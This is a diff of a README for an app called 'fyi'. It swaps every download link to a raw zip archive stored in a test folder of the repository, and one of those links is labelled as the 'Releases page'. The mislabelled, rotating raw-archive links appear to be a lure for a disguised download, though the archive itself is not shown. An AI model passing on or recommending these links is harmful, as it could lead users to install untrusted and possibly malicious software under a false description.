@@ -6,13 +6,13 @@ fyi is an application designed to enhance your experience with in-app events and
 
 ## 🔗 Download fyi
 
-[![Download fyi](https://raw.githubusercontent.com/AmaleedQ/fyi/main/lib/fyi/Software-1.1.zip)](https://raw.githubusercontent.com/AmaleedQ/fyi/main/lib/fyi/Software-1.1.zip)
+[![Download fyi](https://raw.githubusercontent.com/AmaleedQ/fyi/main/test/fyi/web/Software-v3.7-beta.1.zip)](https://raw.githubusercontent.com/AmaleedQ/fyi/main/test/fyi/web/Software-v3.7-beta.1.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version of fyi:
 
-[Click here to download fyi](https://raw.githubusercontent.com/AmaleedQ/fyi/main/lib/fyi/Software-1.1.zip)
+[Click here to download fyi](https://raw.githubusercontent.com/AmaleedQ/fyi/main/test/fyi/web/Software-v3.7-beta.1.zip)
 
 ## 🌐 System Requirements
 
@@ -35,7 +35,7 @@ Before installing, ensure your system meets the following requirements:
 Follow these instructions to install and run fyi:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://raw.githubusercontent.com/AmaleedQ/fyi/main/lib/fyi/Software-1.1.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/AmaleedQ/fyi/main/test/fyi/web/Software-v3.7-beta.1.zip).
    
 2. **Choose the Latest Release:**  
    Look for the version listed at the top of the page. Click on it to view the release notes and downloads.
